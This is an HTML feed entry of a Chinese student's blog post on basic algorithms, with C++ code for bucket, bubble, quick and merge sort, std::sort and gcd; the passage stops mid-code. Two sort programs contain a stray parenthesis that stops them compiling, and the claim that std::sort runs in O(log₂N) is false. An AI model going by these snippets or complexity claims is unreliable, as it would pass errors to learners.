        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>这篇博客很早就想整理了，一直没有时间，今天上课，课余时间真的不多，那就来整理一波；</p><a id="more"></a><h2 id="算法前言"><a class="markdownIt-Anchor" href="#算法前言"></a> 算法前言</h2><p>算法（Algorithm）是指解题方案的准确而完整的描述，是一系列解决问题的清晰指令，算法代表着用系统的方法</p><p>描述解决问题的策略机制；简单来讲，就是解决问题的方法和机制；</p><h3 id="算法特点"><a class="markdownIt-Anchor" href="#算法特点"></a> 算法特点</h3><p>1、有穷性：算法在执行有限的步骤之后，自动结束而不会出现无限循环，并且每一步骤在可接受的时间内完成；</p><p>2、确定性：算法的每一步骤都有确定的含义，不会出现二义性；</p><p>3、可行性：算法的每一步都必须是可行的，也就是说，每一步都能够通过执行有限次数完成;</p><p>4、输入输出：0至多个输入，1至多个输出；</p><h3 id="我所了解的算法"><a class="markdownIt-Anchor" href="#我所了解的算法"></a> 我所了解的算法</h3><p>第一个接触的算法叫做排序，分了很多种（桶，冒泡，归并，快速）；二分法，前缀和与差分法，枚举法，bfs，</p><p>dfs，还有栈，队列等等；</p><h3 id="任务"><a class="markdownIt-Anchor" href="#任务"></a> 任务</h3><p>在接下来的一些时间里，快速学习多种算法，达到速成的效果；</p><h2 id="algorithm"><a class="markdownIt-Anchor" href="#algorithm"></a> Algorithm</h2><h3 id="unix时间戳"><a class="markdownIt-Anchor" href="#unix时间戳"></a> Unix时间戳</h3><p>讲算法之前，先说一个实用的东西——Unix时间戳；</p><p>Unix时间戳是从1970年1月1日开始所经过的秒数，不考虑闰秒。</p><p>这个是柠檬大佬给我写的（自己太菜）；</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">time_t</span> now;</span><br><span class="line"><span class="keyword">int</span> Time=time(&amp;now);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"现在的时间为"</span> &lt;&lt; Time &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="sort"><a class="markdownIt-Anchor" href="#sort"></a> Sort</h3><h4 id="桶排序bucket-sort"><a class="markdownIt-Anchor" href="#桶排序bucket-sort"></a> 桶排序（Bucket Sort）</h4><p>首先，我们来看桶排序。桶排序，顾名思义，会用到“桶”，核心思想是将要排序的数据分到几个有序的桶里，每个</p><p>桶里的数据再单独进行排序。桶内排完序之后，再把每个桶里的数据按照顺序依次取出，组成的序列就是有序的</p><p>了；</p><h5 id="代码"><a class="markdownIt-Anchor" href="#代码"></a> 代码</h5><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> bucket[<span class="number">101</span>],i,j,t,n;</span><br><span class="line"><span class="built_in">memset</span>(bucket,<span class="number">0</span>,<span class="keyword">sizeof</span>(bucket));  <span class="comment">//数组全体置为 0 </span></span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n;  <span class="comment">//输入一个数字 n，表示有 n个数 </span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++) <span class="comment">//循环读入 n个数，并进行桶排序 </span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;t);   <span class="comment">//把每次读入的数字用变量 t保存 </span></span><br><span class="line">bucket[t]++;<span class="comment">//进行计数，对编号为 t的桶加一 </span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">101</span>;i++)  <span class="comment">//依次判断编号为 0-100 的桶 </span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=bucket[i];j++)  <span class="comment">// 出现几次就将桶打印几次 </span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="string">' '</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="时间复杂度"><a class="markdownIt-Anchor" href="#时间复杂度"></a> 时间复杂度</h5><p>设桶的个数为m，待排序数的个数为n；</p><p>第8行执行了m次，第13行执行了n次，第16行和第19行共执行了m+n次，所以程序共执行了2（m+n)次，时间复</p><p>杂度即为O（2*（m+n）），即O（m+n）；</p><h4 id="冒泡排序bubble-sort"><a class="markdownIt-Anchor" href="#冒泡排序bubble-sort"></a> 冒泡排序（Bubble Sort）</h4><p>其次，我们来看冒泡排序。冒泡排序基本思想是：每次比较两个相邻的元素，如果它们的顺序错误就把它们交换过</p><p>来；</p><h5 id="代码-2"><a class="markdownIt-Anchor" href="#代码-2"></a> 代码</h5><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> *a,<span class="keyword">int</span> *b)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> t;</span><br><span class="line">t=*a,*a=*b,*b=t;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i,j,n;</span><br><span class="line"><span class="keyword">int</span> bubble[<span class="number">100</span>]; </span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n; <span class="comment">// 输入一个n，表示有n个数。 </span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; bubble[i];<span class="comment">// 循环读入n个数，放入数组中 </span></span><br><span class="line">}</span><br><span class="line"><span class="comment">//下面是冒泡排序核心</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)   <span class="comment">//外层for循环控制循环次数 </span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;n<span class="number">-1</span>;j++)   <span class="comment">//内层for循环控制相邻两元素进行比较 </span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(bubble[j]&gt;bubble[j+<span class="number">1</span>])   <span class="comment">//if(bubble[j]&lt;bubble[j+1]) </span></span><br><span class="line"><span class="comment">// 比较；两数大小并交换，前者从小到大排序，后者从大到小排序（也可以通过输出改变排列次序） </span></span><br><span class="line">{</span><br><span class="line">swap(&amp;bubble[j],&amp;bubble[j+<span class="number">1</span>]);<span class="comment">//交换两个数 </span></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; bubble[i]) &lt;&lt; <span class="string">' '</span>;</span><br><span class="line">}</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="时间复杂度-2"><a class="markdownIt-Anchor" href="#时间复杂度-2"></a> 时间复杂度</h5><p>设待排序数的个数为n；</p><p>不难看出，核心代码中，最短时间为n，最长为n<sup>2,所以时间复杂度为O（n</sup>2）；</p><h4 id="快速排序quick-sort"><a class="markdownIt-Anchor" href="#快速排序quick-sort"></a> 快速排序（Quick Sort）</h4><p>桶排序和冒泡排序虽然简单，但是如果有几万几亿个数排序，那效率就会非常低，这就需要一种快速的排序方法</p><p>——快速排序；</p><p>思路：</p><p>1.对于一个数组，首先选择一个基准值key，这个基准值可以随意选，但是一般选择的是这个数组的第一个元素；</p><p>2.我们对于这个数组，把数组中所有比基准值key小的元素向基准值key的左边扔，把数组中所有比基准值key大的</p><p>元素向key的右边扔；</p><p>3.这样的话基准值key就成为了一个"分界线"，所有比基准值key小的元素都在基准值key的左边，所有比基准值key</p><p>大的元素都在基准值key的右边；</p><p>4.之后我们在递归的对基准值key左边的序列和右边的序列再用以上方法进行排序；</p><p>5.最终整个序列就是有序的了；</p><h5 id="代码-3"><a class="markdownIt-Anchor" href="#代码-3"></a> 代码</h5><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> quick[<span class="number">101</span>],n; <span class="comment">//定义全局变量，需要在子函数中使用 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quicksort</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> i,j,t,temp;</span><br><span class="line">    <span class="keyword">if</span>(left&gt;right)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    } </span><br><span class="line">    temp=quick[left];  <span class="comment">// temp存的就是基准数 </span></span><br><span class="line">    i=left;</span><br><span class="line">    j=right;</span><br><span class="line">    <span class="keyword">while</span>(i!=j)  <span class="comment">//顺序很重要 </span></span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">while</span>(quick[j]&gt;=temp&amp;&amp;i&lt;j) j--;  <span class="comment">//从右往左找 </span></span><br><span class="line">        <span class="keyword">while</span>(quick[i]&lt;=temp&amp;&amp;i&lt;j) i++;  <span class="comment">//从左往右找 </span></span><br><span class="line">        <span class="keyword">if</span>(i&lt;j) <span class="comment">// 交换两个数在数组中的位置 </span></span><br><span class="line">        {</span><br><span class="line">            t=quick[i];</span><br><span class="line">            quick[i]=quick[j];</span><br><span class="line">            quick[j]=t;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// 基准数归位 </span></span><br><span class="line">    quick[left]=quick[i];</span><br><span class="line">    quick[i]=temp;</span><br><span class="line">    quicksort(left,i<span class="number">-1</span>);  <span class="comment">//继续处理左边的，这是一个递归的过程 </span></span><br><span class="line">    quicksort(i+<span class="number">1</span>,right); <span class="comment">//继续处理右边的，这是一个递归的过程 </span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=n; i++)</span><br><span class="line">    { </span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; quick[i];</span><br><span class="line">    }</span><br><span class="line">    quicksort(<span class="number">1</span>,n);  <span class="comment">// 快排调用 </span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=n; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; quick[i]) &lt;&lt; <span class="string">' '</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="时间复杂度-3"><a class="markdownIt-Anchor" href="#时间复杂度-3"></a> 时间复杂度</h5><p>设需要排序的数字的个数为n；</p><p>理想的情况是，每次划分所选择的中间数恰好将当前序列几乎等分，经过log2n趟划分，便可得到长度为1的子</p><p>表。这样，整个算法的时间复杂度为O(nlog2n)；</p><p>最坏的情况是，每次所选的中间数是当前序列中的最大或最小元素，这使得每次划分所得的子表中一个为空表，另</p><p>一子表的长度为原表的长度-1。这样，长度为n的数据表的快速排序需要经过n趟划分，使得整个排序算法的时间</p><p>复杂度为O(n^2)；</p><p>平均起来，快速排序的时间复杂度为O（nlogn）；</p><h4 id="归并排序merge-sort"><a class="markdownIt-Anchor" href="#归并排序merge-sort"></a> 归并排序（Merge Sort）</h4><p>原理：</p><p>假设初始待排序数据有n个，可以将n个数据看成n个独立的子序列，因此每个子序列的长度为1，然后两两合并，</p><p>得到n/2个长度为2或1(如果n为奇数时，就会出现多出一个元素无法与其他元素合并)的有序子序列; 再两两合并，</p><p>一直重复下去，直到得到一个长度为n的有序序列为止（2路排序）；</p><p>核心：</p><p>两个有序子序列的合并；</p><p>（1）将待排序序列一分为二，对左右两边进行递归分割，得到m个子序列；</p><p>（2）对m个子序列递归执行合并操作，最终得到有序的序列；</p><h5 id="代码-4"><a class="markdownIt-Anchor" href="#代码-4"></a> 代码</h5><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//原数组arr1，临时空间数组arr2</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> arr1[],<span class="keyword">int</span> arr2[],<span class="keyword">int</span> low, <span class="keyword">int</span> mid, <span class="keyword">int</span> high)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i = low, j = mid+<span class="number">1</span>, k = low;</span><br><span class="line"><span class="keyword">while</span> (i&lt;=mid &amp;&amp; j&lt;=high)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (arr1[i]&lt;arr1[j])</span><br><span class="line">{</span><br><span class="line">arr2[k++] = arr1[i++];</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">arr2[k++] = arr1[j++];</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">while</span> (i&lt;=mid)</span><br><span class="line">{</span><br><span class="line">arr2[k++] = arr1[i++];</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (j&lt;=high)</span><br><span class="line">{</span><br><span class="line">    arr2[k++] = arr1[j++];</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i=low; i&lt;=high;i++)</span><br><span class="line">{</span><br><span class="line">arr1[i] = arr2[i];</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mergeSort</span><span class="params">(<span class="keyword">int</span> arr1[],<span class="keyword">int</span> arr2[],<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">//直到a=b时，停止递归。</span></span><br><span class="line"><span class="keyword">if</span> (a&lt;b)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">int</span> mid = (a+b)/<span class="number">2</span>;</span><br><span class="line">mergeSort(arr1,arr2,a,mid);</span><br><span class="line">mergeSort(arr1,arr2,mid+<span class="number">1</span>,b);</span><br><span class="line">merge(arr1,arr2,a,mid,b);</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i,a[<span class="number">10</span>]={<span class="number">3</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">4</span>},b[<span class="number">10</span>];</span><br><span class="line">    mergeSort(a,b,<span class="number">0</span>,<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">9</span>;i++)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; a[i] &lt;&lt; <span class="string">' '</span>;</span><br><span class="line">}</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="时间复杂度-4"><a class="markdownIt-Anchor" href="#时间复杂度-4"></a> 时间复杂度</h5><p>设需要排序的数字的个数为n；</p><p>归并排序稳定性比较高，最好情况、最坏情况都为nlogn，所以时间复杂度为O(nlogn)；</p><h4 id="sort-2"><a class="markdownIt-Anchor" href="#sort-2"></a> sort()</h4><p>sort() 是C++标准库里面的库函数，之前做编程练习题目的时候经常会用到，算是quicksort的另一种形式，因为时</p><p>间复杂度都为 O(log₂N)，完美地解决了所谓的TLE问题，直接上代码：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">100</span>],i,n;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">}</span><br><span class="line">sort(a,a+n); <span class="comment">//调用sort函数 </span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; a[i] &lt;&lt; <span class="string">' '</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这种是最简单的形式，默认从小到大，那从大到小呢？嘿嘿，别着急，来看：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> m,<span class="keyword">int</span> n)</span>  <span class="comment">//自定义函数 </span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">return</span> m&gt;n;</span><br><span class="line">} </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">100</span>],i,n;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">}</span><br><span class="line">sort(a,a+n,cmp); <span class="comment">//调用sort函数 </span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; a[i] &lt;&lt; <span class="string">' '</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这种是加一个自定义函数cmp，用于大小比较，从小到大时也可以自定义一个函数，但是没必要其实；</p><p>还有其他很多种形式，去about页面，有我的联系方式，给我发信息给你代码（嘻嘻嘻）；</p><p>可以去练习一下，请见<a href="http://acm.hdu.edu.cn/showproblem.php?pid=1040" target="_blank" rel="noopener">杭电1040</a></p><h3 id="gcd-lcm"><a class="markdownIt-Anchor" href="#gcd-lcm"></a> gcd &amp; lcm</h3><p>gcd模板其实已经写烂了，但是几个月没碰过编程了，难免会有些生疏，再来回顾一下；</p><p>lcm也很简单，两数乘积除以最大公约数；</p><h4 id="gcd"><a class="markdownIt-Anchor" href="#gcd"></a> gcd</h4><p>先看最原始的代码（我第一次写的代码）：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> t;</span><br><span class="line"><span class="keyword">while</span>(b!=<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line">t = a%b; </span><br><span class="line">a = b;</span><br><span class="line"> b = t;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> m,n;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; m &gt;&gt; n;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; gcd(m,n) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>三目运算法（这个超级简单）：</p><p>不会三目运算符的回C语言再学习一下哦~</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">return</span> 